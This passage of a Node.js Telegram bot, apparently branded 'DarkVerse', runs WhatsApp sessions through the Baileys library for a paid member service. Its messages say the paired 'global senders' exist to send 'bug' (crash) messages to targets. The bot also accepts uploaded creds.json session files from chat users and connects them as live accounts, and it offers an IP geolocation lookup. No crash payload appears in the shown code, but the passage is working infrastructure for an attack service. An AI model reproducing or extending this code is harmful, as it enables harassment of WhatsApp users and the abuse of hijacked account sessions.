          console.log(`[⚠️ CONFLICT] Sesi ${sessionName} conflict, skip reconnect`);
          delete activeConnections[sessionName];
          return resolve();
        }

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }
  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) { return false; }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// ============================================================
// 🌐 GLOBAL SENDER — Pairing & Session Management (TANPA BATAS)
// ============================================================
async function pairingGlobalWa(number, attempt = 1) {
  // Tidak ada batasan retry, akan terus mencoba sampai berhasil
  const globalFolder = path.join('permenmd', 'global');
  const sessionDir = path.join(globalFolder, number);

  if (!fs.existsSync(globalFolder)) fs.mkdirSync(globalFolder, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      globalConnections[number] = sock;
      console.log(`[🌐 GLOBAL] Sender ${number} ONLINE`);

      // Update status aktif di JSON
      const senders = loadGlobalSenders();
      const idx = senders.findIndex(s => s.number === number);
      if (idx !== -1) {
        senders[idx].active = true;
        saveGlobalSenders(senders);
      }

    } else if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
      delete globalConnections[number];
      console.log(`[🌐 GLOBAL] Sender ${number} OFFLINE (${statusCode})`);

      if (isLoggedOut) {
        // Hapus dari list jika logout
        const senders = loadGlobalSenders().filter(s => s.number !== number);
        saveGlobalSenders(senders);
        console.log(`[🌐 GLOBAL] Sender ${number} dihapus karena logout.`);
      } else {
        // Reconnect terus menerus tanpa batas
        console.log(`[🌐 GLOBAL] Reconnecting ${number} attempt ${attempt + 1}...`);
        await waiting(5000);
        await pairingGlobalWa(number, attempt + 1);
      }
    }
  });

  return sock;
}

// Start semua global sender yang sudah tersimpan
async function startGlobalSessions() {
  const globalFolder = path.join('permenmd', 'global');
  if (!fs.existsSync(globalFolder)) {
    fs.mkdirSync(globalFolder, { recursive: true });
    console.log('[🌐 GLOBAL] Folder global dibuat, belum ada sender.');
    return;
  }

  const subdirs = fs.readdirSync(globalFolder).filter(f => {
    try { return fs.lstatSync(path.join(globalFolder, f)).isDirectory(); }
    catch { return false; }
  });

  console.log(`[🌐 GLOBAL] Ditemukan ${subdirs.length} global sender tersimpan.`);

  for (const number of subdirs) {
    if (!globalConnections[number]) {
      console.log(`[🌐 GLOBAL] Starting global sender: ${number}`);
      await pairingGlobalWa(number);
    }
  }
}
// ============================================================

async function startUserSessions() {
  const subfolders = fs.readdirSync('permenmd')
    .filter(name => name !== 'global') // skip folder global
    .map(name => path.join('permenmd', name))
    .filter(p => {
      try { return fs.lstatSync(p).isDirectory(); }
      catch { return false; }
    });

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Telegram Command Handlers =====

// ============================================================
// 📋 /start atau /menu — Dengan tombol Add Sender Global
// ============================================================
bot.onText(/^\/?(?:start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  // ✅ FIX: Gunakan fungsi yang sudah didefinisikan
  const activeGs = countActiveGlobalSenders();
  const totalGs = loadGlobalSenders().length;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [
          [{ text: `🌐 Add Sender Global (${activeGs}/${totalGs} aktif)`, callback_data: "add_global_sender" }],
          [{ text: "🗑 Hapus Sender Global", callback_data: "remove_global_sender" }],
          [
            { text: "📋 List User", callback_data: "list_user" },
            { text: "🎛 Buat Custom User", callback_data: "create_custom" },
            { text: "🗑 Hapus User", callback_data: "delete_user" }
          ]
        ] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:\n\n🌐 *Global Sender:* ${activeGs}/${totalGs} aktif\n\n*Catatan:* Tidak ada batasan jumlah global sender, kamu bisa menambah sebanyak yang kamu mau!`, { ...options, parse_mode: "Markdown" });
});
// ============================================================

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  await refreshUserSessions();
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += connectedMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += connectedBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += connectedNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

// ============================================================
// 📡 /ceksender — Publik, bisa dipakai siapa saja di grup
// ============================================================
bot.onText(/^\/?ceksender$/, (msg) => {
  const chatId = msg.chat.id;
  const senders = loadGlobalSenders();

  if (!senders.length) {
    return bot.sendMessage(chatId,
      "📡 *Global Sender*\n\n❌ Belum ada sender global yang terdaftar.\n\n*Catatan:* Tidak ada batasan jumlah global sender, kamu bisa menambah sebanyak yang kamu mau!",
      { parse_mode: "Markdown" }
    );
  }

  // ✅ Gunakan fungsi countActiveGlobalSenders
  const activeCount = countActiveGlobalSenders();

  const lines = senders.map((s, i) => {
    const isActive = !!globalConnections[s.number];
    const status = isActive ? "🟢 Online" : "🔴 Offline";
    return `${i + 1}. \`${censorNumber(s.number)}\` — ${status}`;
  });

  const message = [
    `📡 *Global Sender List*`,
    ``,
    lines.join('\n'),
    ``,
    `✅ Aktif: *${activeCount}/${senders.length}*`,
    `📊 Total Sender: *${senders.length}* (Tidak Ada Batasan)`,
    `_Sender global dapat digunakan oleh tk & Owner_`
  ].join('\n');

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
// ============================================================

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const chatId = query.message?.chat?.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  // 🔥 FIX: Selalu jawab callback query terlebih dahulu
  try {
    await bot.answerCallbackQuery(query.id);
  } catch (err) {
    console.error("Answer callback error:", err.message);
  }

  if (!isUser) return;

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*\n${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:\n👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;

    // ============================================================
    // 🌐 ADD GLOBAL SENDER — Flow pairing via Telegram (TANPA BATAS)
    // ============================================================
    case "add_global_sender":
      if (!isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Hanya owner yang bisa menambah global sender.", show_alert: true });
      }

      bot.answerCallbackQuery(query.id);
      bot.sendMessage(id,
        "📱 *Tambah Global Sender*\n\nMasukkan nomor WhatsApp yang akan dijadikan sender global.\n\nFormat: `628xxxxxxxxxx` (tanpa + atau spasi)\n\n*Catatan:* Tidak ada batasan jumlah sender global. Kamu bisa menambah sebanyak yang kamu mau!",
        { parse_mode: "Markdown" }
      );

      bot.once("message", async (msg2) => {
        const rawNumber = (msg2.text || "").replace(/\D/g, "").trim();

        if (!rawNumber || rawNumber.length < 8) {
          return bot.sendMessage(id, "❌ Nomor tidak valid. Masukkan nomor lengkap dengan kode negara (contoh: 628123456789).");
        }

        // Cek apakah sudah terdaftar
        const existing = loadGlobalSenders();
        if (existing.find(s => s.number === rawNumber)) {
          // Coba reconnect jika belum aktif
          if (!globalConnections[rawNumber]) {
            bot.sendMessage(id, `⚠️ Nomor *${censorNumber(rawNumber)}* sudah terdaftar tapi offline. Mencoba reconnect...`, { parse_mode: "Markdown" });
            await pairingGlobalWa(rawNumber);
            return;
          }
          return bot.sendMessage(id, `⚠️ Nomor *${censorNumber(rawNumber)}* sudah terdaftar dan aktif.`, { parse_mode: "Markdown" });
        }

        bot.sendMessage(id, `⏳ Generating pairing code untuk *${censorNumber(rawNumber)}*...`, { parse_mode: "Markdown" });

        try {
          const globalFolder = path.join('permenmd', 'global');
          const sessionDir = path.join(globalFolder, rawNumber);

          if (!fs.existsSync(globalFolder)) fs.mkdirSync(globalFolder, { recursive: true });
          if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

          const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
          const { version } = await fetchLatestBaileysVersion();

          const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            version,
            defaultQueryTimeoutMs: undefined,
          });

          sock.ev.on("creds.update", saveCreds);

          if (!sock.authState.creds.registered) {
            await waiting(1500);
            let code;
            try {
              code = await sock.requestPairingCode(rawNumber);
            } catch (pairingErr) {
              return bot.sendMessage(id, `❌ Gagal generate pairing code: ${pairingErr.message}`);
            }

            if (!code) {
              return bot.sendMessage(id, "❌ Gagal mendapatkan pairing code. Coba lagi.");
            }

            // Simpan ke globalSenders.json dulu (belum aktif)
            const senders = loadGlobalSenders();
            if (!senders.find(s => s.number === rawNumber)) {
              senders.push({ number: rawNumber, active: false, addedAt: new Date().toISOString() });
              saveGlobalSenders(senders);
            }

            bot.sendMessage(id,
              `✅ *Pairing Code Global Sender*\n\n📱 Nomor: \`${rawNumber}\`\n🔑 Kode: \`${code}\`\n\n_Buka WhatsApp → Setelan → Perangkat Tertaut → Tautkan Perangkat → Masukkan kode di atas_\n\n⏳ Menunggu koneksi...\n\n*Info:* Tidak ada batasan jumlah global sender, kamu bisa menambah sebanyak yang kamu mau!`,
              { parse_mode: "Markdown" }
            );

            // Handle connection events setelah pairing
            sock.ev.on("connection.update", async (update) => {
              const { connection, lastDisconnect } = update;

              if (connection === "open") {
                globalConnections[rawNumber] = sock;

                const senders = loadGlobalSenders();
                const idx = senders.findIndex(s => s.number === rawNumber);
                if (idx !== -1) { senders[idx].active = true; saveGlobalSenders(senders); }

                bot.sendMessage(id,
                  `🟢 *Global Sender Terhubung!*\n\n📱 Nomor: \`${censorNumber(rawNumber)}\`\nStatus: *Online*\n\n✅ Sender ini sekarang bisa digunakan oleh tk & Owner untuk mengirim bug.\n\n📊 Total Global Sender: ${loadGlobalSenders().length}`,
                  { parse_mode: "Markdown" }
                );

                // Notif ke grup utama
                sendToGroupsUtama(`🌐 *Global Sender Baru*\nNomor: \`${censorNumber(rawNumber)}\`\nStatus: 🟢 Online\nTotal Global Sender: ${loadGlobalSenders().length}`, { parse_mode: "Markdown" });

              } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
                delete globalConnections[rawNumber];

                if (isLoggedOut) {
                  const senders = loadGlobalSenders().filter(s => s.number !== rawNumber);
                  saveGlobalSenders(senders);
                  bot.sendMessage(id, `🔴 Global sender \`${censorNumber(rawNumber)}\` logout dan dihapus dari list.`, { parse_mode: "Markdown" });
                } else {
                  console.log(`[🌐 GLOBAL] Sender ${rawNumber} disconnected, reconnecting...`);
                  await waiting(5000);
                  await pairingGlobalWa(rawNumber);
                }
              }
            });

          } else {
            // Sudah registered, langsung connect
            bot.sendMessage(id, `⚠️ Nomor *${censorNumber(rawNumber)}* sudah pernah pairing. Menghubungkan...`, { parse_mode: "Markdown" });

            sock.ev.on("connection.update", async (update) => {
              const { connection } = update;
              if (connection === "open") {
                globalConnections[rawNumber] = sock;

                const senders = loadGlobalSenders();
                if (!senders.find(s => s.number === rawNumber)) {
                  senders.push({ number: rawNumber, active: true, addedAt: new Date().toISOString() });
                  saveGlobalSenders(senders);
                } else {
                  const idx = senders.findIndex(s => s.number === rawNumber);
                  senders[idx].active = true;
                  saveGlobalSenders(senders);
                }

                bot.sendMessage(id, `🟢 Global sender *${censorNumber(rawNumber)}* berhasil terhubung!`, { parse_mode: "Markdown" });
              }
            });
          }

        } catch (err) {
          console.error("[🌐 GLOBAL ADD ERROR]", err);
          bot.sendMessage(id, `❌ Error saat menambah global sender: ${err.message}`);
        }
      });
      break;
    // ============================================================

    // ============================================================
    // ❌ REMOVE GLOBAL SENDER via Telegram
    // ============================================================
    case "remove_global_sender":
      if (!isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Hanya owner yang bisa menghapus global sender.", show_alert: true });
      }

      bot.answerCallbackQuery(query.id);

      const sendersList = loadGlobalSenders();
      if (!sendersList.length) {
        return bot.sendMessage(id, "❌ Tidak ada sender global yang terdaftar.");
      }

      const senderButtons = sendersList.map((s, i) => {
        const isActive = !!globalConnections[s.number];
        return [{
          text: `${isActive ? '🟢' : '🔴'} ${censorNumber(s.number)}`,
          callback_data: `del_gs_${s.number}`
        }];
      });
      senderButtons.push([{ text: "❌ Batal", callback_data: "cancel_gs_remove" }]);

      bot.sendMessage(id, "🗑 *Pilih sender global yang ingin dihapus:*", {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: senderButtons }
      });
      break;

    case "cancel_gs_remove":
      bot.answerCallbackQuery(query.id, { text: "Dibatalkan." });
      break;
  }

  // Handle delete specific global sender
  if (data && data.startsWith("del_gs_")) {
    if (!isOwner) {
      return bot.answerCallbackQuery(query.id, { text: "❌ Tidak diizinkan.", show_alert: true });
    }

    const numberToDelete = data.replace("del_gs_", "");

    if (globalConnections[numberToDelete]) {
      try { globalConnections[numberToDelete].ws.close(); } catch (e) { }
      delete globalConnections[numberToDelete];
    }

    const sessionDir = path.join('permenmd', 'global', numberToDelete);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

    const newSenders = loadGlobalSenders().filter(s => s.number !== numberToDelete);
    saveGlobalSenders(newSenders);

    bot.answerCallbackQuery(query.id, { text: `✅ Sender ${censorNumber(numberToDelete)} dihapus.` });
    bot.sendMessage(id, `✅ Global sender \`${censorNumber(numberToDelete)}\` berhasil dihapus.\n\n📊 Total Global Sender sekarang: ${newSenders.length}`, { parse_mode: "Markdown" });

    sendToGroupsUtama(`🌐 *Global Sender Dihapus*\nNomor: \`${censorNumber(numberToDelete)}\`\nTotal Global Sender: ${newSenders.length}`, { parse_mode: "Markdown" });
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const gsActive = countActiveGlobalSenders();
    const gsTotal = loadGlobalSenders().length;

    const text = `*DarkVerse Server Status*\n\n*Server Online* [${new Date().toLocaleTimeString()}]\n*Ping:* ~${ping}ms\n*RAM:* ${ramUsage.toFixed(2)} MB\n*CPU:* ${cpuLoad.toFixed(2)}\n*Uptime:* ${uptime}\n*Total Database:* ${dbLength}\n*Global Sender:* ${gsActive}/${gsTotal} aktif (Tanpa Batas)\n*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?(${cmd})$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const cbChatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(cbChatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(cbChatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

registerResetButton("resetakunowner", "tk");
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunowner", "admin");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
